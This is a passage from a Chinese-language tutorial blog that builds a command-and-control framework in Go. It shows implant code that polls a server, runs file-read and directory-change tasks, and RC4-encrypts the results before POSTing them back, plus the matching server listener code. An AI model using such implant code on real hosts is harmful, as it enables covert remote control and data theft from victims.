class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		AssemblyBuff []<span class="type">byte</span></span><br><span class="line">		err          <span class="type">error</span></span><br><span class="line">		res          []<span class="type">byte</span></span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	profile.BeaconProfile, err = profile.LoadConfig()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, profile.BeaconProfile)</span><br><span class="line"></span><br><span class="line">	heartBeat = sysinfo.InitHeartBeat()</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, heartBeat)</span><br><span class="line"></span><br><span class="line">	metaData := sysinfo.PackHeartBeat(heartBeat)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		time.Sleep(time.Duration(profile.BeaconProfile.Sleep) * time.Second)</span><br><span class="line">		AssemblyBuff, err = common.HttpGet(metaData, heartBeat.SessionKey)</span><br><span class="line">		<span class="built_in">println</span>(<span class="type">string</span>(AssemblyBuff))</span><br><span class="line">		<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">			parser := packet.CreateParser(AssemblyBuff)</span><br><span class="line">			<span class="keyword">for</span> parser.Size() &gt; <span class="number">0</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> parser.Size() &lt; <span class="number">4</span> &#123;</span><br><span class="line">					fmt.Println(<span class="string">&quot;Not enough data for length field&quot;</span>)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// 读取任务包</span></span><br><span class="line">				taskData := parser.ParseBytes()</span><br><span class="line">				taskParser := packet.CreateParser(taskData)</span><br><span class="line"></span><br><span class="line">				<span class="comment">// 解析任务ID和任务数据长度</span></span><br><span class="line">				ok := taskParser.Check([]<span class="type">string</span>&#123;<span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int32&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">if</span> !ok &#123;</span><br><span class="line">					fmt.Println(<span class="string">&quot;Not enough data for taskId and commandId&quot;</span>)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				&#125;</span><br><span class="line">				taskID := taskParser.ParseInt32()</span><br><span class="line">				commandId := taskParser.ParseInt32()</span><br><span class="line"></span><br><span class="line">				<span class="keyword">switch</span> commandId &#123;</span><br><span class="line">				<span class="keyword">case</span> profile.COMMAND_CAT:</span><br><span class="line">					res, err = command.Cat(taskParser, <span class="type">int</span>(heartBeat.ACP))</span><br><span class="line">					fmt.Println(<span class="string">&quot;taskID: &quot;</span>, taskID)</span><br><span class="line">				<span class="keyword">case</span> profile.COMMAND_CD:</span><br><span class="line">					res, err = command.Cd(taskParser, <span class="type">int</span>(heartBeat.ACP))</span><br><span class="line">				<span class="keyword">default</span>:</span><br><span class="line">					err = errors.New(<span class="string">&quot;This type is not supported now.&quot;</span>)</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">				&#125;</span><br><span class="line">				fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, <span class="type">string</span>(res))</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用postman发送cat命令请求，Beacon的执行结果如下</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/02/16-44-11-7845a9ae65d0c0837d5cf0ede4f8e56e-20250802164411-24616a.png"></p>
<p>用postman发送cd命令请求</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;beacon_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Beacon&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;beacon_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;55667788&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cd C:\Users\BitDefender\Desktop\ProcessExplorer&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cd&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\Users\BitDefender\Desktop\ProcessExplorer&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>Beacon的执行结果如下</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/02/16-55-36-705fedb0abc551139b1b7f74faecfcf8-20250802165536-58eee9.png"></p>
<h2 id="6-3-结果返回"><a href="#6-3-结果返回" class="headerlink" title="6.3 结果返回"></a>6.3 结果返回</h2><p>接下来就是将错误和结果打包成<strong>结果包</strong>，每完成一个任务就通过POST的方式发送给Server，所以结果包长什么样子呢？一个结果包 &#x3D; 除长度字段外结果包长度 4B + taskId 4B + commandId 4B + 结果数据。<strong>其实长度字段记录的长度都不包括其本身</strong>，请各位师傅知悉！</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/02/21-21-18-3e83baca1a11adb2b400aafa88f309b0-%E7%BB%93%E6%9E%9C%E5%8C%85-b69b2a.png" alt="结果包.png"></p>
<p>接下来是Beacon端的代码</p>
<p><code>profile/profile.go</code>：增加 <code>COMMAND_ERROR_REPORT</code> 表示命令执行出错</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	COMMAND_CAT = <span class="number">1</span></span><br><span class="line">	COMMAND_CD  = <span class="number">2</span></span><br><span class="line">	COMMAND_ERROR_REPORT  = <span class="number">100</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><code>utils/packet/packer.go</code>：增加MakeFinalPacket放用于打包最后的结果包</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MakeFinalPacket</span><span class="params">(taskId <span class="type">uint</span>, commandId <span class="type">uint</span>, data []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		array    []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">		err      <span class="type">error</span></span><br><span class="line">		packData []<span class="type">byte</span></span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	array = <span class="built_in">append</span>(array, <span class="type">int32</span>(taskId))</span><br><span class="line">	array = <span class="built_in">append</span>(array, <span class="type">int32</span>(commandId))</span><br><span class="line">	array = <span class="built_in">append</span>(array, data)</span><br><span class="line"></span><br><span class="line">	packData, err = PackArray(array)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	finalData := PackBytes(packData)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> finalData</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/common/http.go</code> 增加HttpPost方法，用于将结果包发送给服务器</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HttpPost</span><span class="params">(metaData []<span class="type">byte</span>, body []<span class="type">byte</span>, sessionKey []<span class="type">byte</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	url := profile.BeaconProfile.CallbackAddresses[<span class="number">0</span>] + <span class="string">&quot;/&quot;</span> + profile.BeaconProfile.URI</span><br><span class="line"></span><br><span class="line">	<span class="comment">// RC4加密metaData并base64url编码</span></span><br><span class="line">	rc4Key := profile.BeaconProfile.EncryptKey</span><br><span class="line">	encryptedMetaData, err := RC4Crypt(metaData, rc4Key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;rc4 encrypt metaData error: %w\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	metaDataB64 := base64.RawURLEncoding.EncodeToString(encryptedMetaData)</span><br><span class="line">	cookieValue := profile.BeaconProfile.HBPrefix + metaDataB64</span><br><span class="line"></span><br><span class="line">	<span class="comment">// RC4加密body</span></span><br><span class="line">	encryptedBody, err := RC4Crypt(body, sessionKey)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;rc4 encrypt body error: %w\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 构造HTTP请求</span></span><br><span class="line">	req, err := http.NewRequest(<span class="string">&quot;POST&quot;</span>, url, bytes.NewReader(encryptedBody))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;request error: %w\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	req.Header.Set(profile.BeaconProfile.HBHeader, cookieValue)</span><br><span class="line">	req.Header.Set(profile.BeaconProfile.UserAgent, <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 发送HTTP POST请求</span></span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;http error: %w\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 读取响应体</span></span><br><span class="line">	respBytes, err := io.ReadAll(resp.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;read response error: %w\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Status:&quot;</span>, resp.StatusCode)</span><br><span class="line">		fmt.Println(<span class="string">&quot;Decrypted Response:&quot;</span>, <span class="type">string</span>(respBytes))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>main.go</code> 在代码的末尾调用MakeFinalPacket制作结果包，然后调用HttpPost发送结果包给服务器</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		AssemblyBuff []<span class="type">byte</span></span><br><span class="line">		err          <span class="type">error</span></span><br><span class="line">		res          []<span class="type">byte</span></span><br><span class="line">		finalpacket  []<span class="type">byte</span></span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	profile.BeaconProfile, err = profile.LoadConfig()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, profile.BeaconProfile)</span><br><span class="line"></span><br><span class="line">	heartBeat = sysinfo.InitHeartBeat()</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, heartBeat)</span><br><span class="line"></span><br><span class="line">	metaData := sysinfo.PackHeartBeat(heartBeat)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		time.Sleep(time.Duration(profile.BeaconProfile.Sleep) * time.Second)</span><br><span class="line">		AssemblyBuff, err = common.HttpGet(metaData, heartBeat.SessionKey)</span><br><span class="line">		<span class="built_in">println</span>(<span class="type">string</span>(AssemblyBuff))</span><br><span class="line">		<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">			parser := packet.CreateParser(AssemblyBuff)</span><br><span class="line">			<span class="keyword">for</span> parser.Size() &gt; <span class="number">0</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> parser.Size() &lt; <span class="number">4</span> &#123;</span><br><span class="line">					fmt.Println(<span class="string">&quot;Not enough data for length field&quot;</span>)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// 读取任务包</span></span><br><span class="line">				taskData := parser.ParseBytes()</span><br><span class="line">				taskParser := packet.CreateParser(taskData)</span><br><span class="line"></span><br><span class="line">				<span class="comment">// 解析任务ID和任务数据长度</span></span><br><span class="line">				ok := taskParser.Check([]<span class="type">string</span>&#123;<span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int32&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">if</span> !ok &#123;</span><br><span class="line">					fmt.Println(<span class="string">&quot;Not enough data for taskId and commandId&quot;</span>)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				&#125;</span><br><span class="line">				taskId := taskParser.ParseInt32()</span><br><span class="line">				commandId := taskParser.ParseInt32()</span><br><span class="line"></span><br><span class="line">				<span class="keyword">switch</span> commandId &#123;</span><br><span class="line">				<span class="keyword">case</span> profile.COMMAND_CAT:</span><br><span class="line">					res, err = command.Cat(taskParser, <span class="type">int</span>(heartBeat.ACP))</span><br><span class="line">					fmt.Println(<span class="string">&quot;taskID: &quot;</span>, taskId)</span><br><span class="line">				<span class="keyword">case</span> profile.COMMAND_CD:</span><br><span class="line">					res, err = command.Cd(taskParser, <span class="type">int</span>(heartBeat.ACP))</span><br><span class="line">				<span class="keyword">default</span>:</span><br><span class="line">					err = errors.New(<span class="string">&quot;This type is not supported now.&quot;</span>)</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">					finalpacket = packet.MakeFinalPacket(taskId, profile.COMMAND_ERROR_REPORT, []<span class="type">byte</span>(err.Error()))</span><br><span class="line">					<span class="built_in">println</span>(<span class="built_in">len</span>(finalpacket))</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					finalpacket = packet.MakeFinalPacket(taskId, commandId, res)</span><br><span class="line">					<span class="built_in">println</span>(<span class="built_in">len</span>(finalpacket))</span><br><span class="line">				&#125;</span><br><span class="line">				common.HttpPost(metaData, finalpacket, heartBeat.SessionKey)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来是Server的代码</p>
<p><code>handler/listener/http_listener.go</code>：补充processResponse方法专门用于处理Beacon的结果回显。<strong>本小节先不实现结果处理，直接打印结果数据</strong>，只是为了验证Beacon是否成功POST到服务器。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler *HTTP)</span></span> processResponse(ctx *gin.Context) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 校验请求合法性  </span></span><br><span class="line">    err := handler.validate(ctx)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取外部 IP    </span></span><br><span class="line">    externalIP := strings.Split(ctx.Request.RemoteAddr, <span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]  </span><br><span class="line">    <span class="keyword">if</span> handler.Config.XForwardedFor &#123;  </span><br><span class="line">       xff := ctx.Request.Header.Get(<span class="string">&quot;X-Forwarded-For&quot;</span>)  </span><br><span class="line">       <span class="keyword">if</span> xff != <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">          externalIP = xff  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beaconId, beat, err := handler.parseBeat(ctx)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       handler.pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> !listenerHTTP.ts.BeaconIsExists(beaconId) &#123;  </span><br><span class="line">       <span class="keyword">if</span> err := listenerHTTP.ts.BeaconCreate(beaconId, beat, handler.Name, externalIP, <span class="literal">true</span>); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          handler.pageError(ctx)  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 处理 agent 数据  </span></span><br><span class="line">    <span class="comment">// 读取原始 body    </span></span><br><span class="line">    bodyBytes, _ := io.ReadAll(ctx.Request.Body)  </span><br><span class="line">    <span class="keyword">defer</span> ctx.Request.Body.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 直接打印（十六进制 + 字符串）  </span></span><br><span class="line">    log.Printf(<span class="string">&quot;[HTTP] ← Raw POST body (%d bytes):\n%s&quot;</span>, <span class="built_in">len</span>(bodyBytes), hex.Dump(bodyBytes))  </span><br><span class="line">    log.Printf(<span class="string">&quot;[HTTP] ← String view:\n%s&quot;</span>, <span class="type">string</span>(bodyBytes))  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Beacon控制台输出：</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/02/18-27-49-0759f33325a218ad29c4174a95743ea2-20250802182749-e01d3b.png"></p>
<p>server控制台输出：</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/02/18-20-46-2421b2368d358f995194e00936cc4586-20250802182045-c2706a.png"></p>
<p>因为我们用的是RC4加密，所以数据长度是一样的，还没解密故server控制台输出乱码。</p>
<p>至此，Beacon端的代码全部编写完成！</p>
<h2 id="6-4-结果处理"><a href="#6-4-结果处理" class="headerlink" title="6.4 结果处理"></a>6.4 结果处理</h2><p>上一小节我们只打印了结果包而没做其他处理，这一小节就是专门用于处理结果包的，按照结果包的顺序来解读结果包，解读之前需要进行解密。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/02/21-21-18-3e83baca1a11adb2b400aafa88f309b0-%E7%BB%93%E6%9E%9C%E5%8C%85-b69b2a.png"></p>
<p><code>handler/listener/http_listener.go</code> 补充调用BeaconProcessData方法进行结果包处理</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler *HTTP)</span></span> processResponse(ctx *gin.Context) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 校验请求合法性  </span></span><br><span class="line">    err := handler.validate(ctx)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取外部 IP    </span></span><br><span class="line">    externalIP := strings.Split(ctx.Request.RemoteAddr, <span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]  </span><br><span class="line">    <span class="keyword">if</span> handler.Config.XForwardedFor &#123;  </span><br><span class="line">       xff := ctx.Request.Header.Get(<span class="string">&quot;X-Forwarded-For&quot;</span>)  </span><br><span class="line">       <span class="keyword">if</span> xff != <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">          externalIP = xff  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beaconId, beat, err := handler.parseBeat(ctx)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       handler.pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> !listenerHTTP.ts.BeaconIsExists(beaconId) &#123;  </span><br><span class="line">       <span class="keyword">if</span> err := listenerHTTP.ts.BeaconCreate(beaconId, beat, handler.Name, externalIP, <span class="literal">true</span>); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          handler.pageError(ctx)  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 处理 agent 数据  </span></span><br><span class="line">    <span class="comment">// 读取原始 body    </span></span><br><span class="line">    bodyBytes, _ := io.ReadAll(ctx.Request.Body)  </span><br><span class="line">    <span class="keyword">defer</span> ctx.Request.Body.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 直接打印（十六进制 + 字符串）  </span></span><br><span class="line">    log.Printf(<span class="string">&quot;[HTTP] ← Raw POST body (%d bytes):\n%s&quot;</span>, <span class="built_in">len</span>(bodyBytes), hex.Dump(bodyBytes))  </span><br><span class="line">    log.Printf(<span class="string">&quot;[HTTP] ← String view:\n%s&quot;</span>, <span class="type">string</span>(bodyBytes))  </span><br><span class="line">  </span><br><span class="line">    err = listenerHTTP.ts.BeaconProcessData(beaconId, bodyBytes)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       handler.pageError(ctx)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    ctx.AbortWithStatus(http.StatusOK)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/listener/http_type.go</code> 定义BeaconProcessData方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">    BeaconIsExists(beaconId <span class="type">string</span>) <span class="type">bool</span>  </span><br><span class="line">    BeaconCreate(beaconId <span class="type">string</span>, beat []<span class="type">byte</span>, listenerName <span class="type">string</span>, ExternalIP <span class="type">string</span>, Async <span class="type">bool</span>) <span class="type">error</span>  </span><br><span class="line">    BeaconGetAllTasks(beaconId <span class="type">string</span>, maxDataSize <span class="type">int</span>) ([]<span class="type">byte</span>, <span class="type">error</span>)  </span><br><span class="line">    BeaconProcessData(beaconId <span class="type">string</span>, bodyData []<span class="type">byte</span>) <span class="type">error</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server/beacon.go</code> 实现BeaconProcessData方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> BeaconProcessData(beaconId <span class="type">string</span>, bodyData []<span class="type">byte</span>) <span class="type">error</span> &#123;  </span><br><span class="line">    value, ok := ts.Beacons.Get(beaconId)  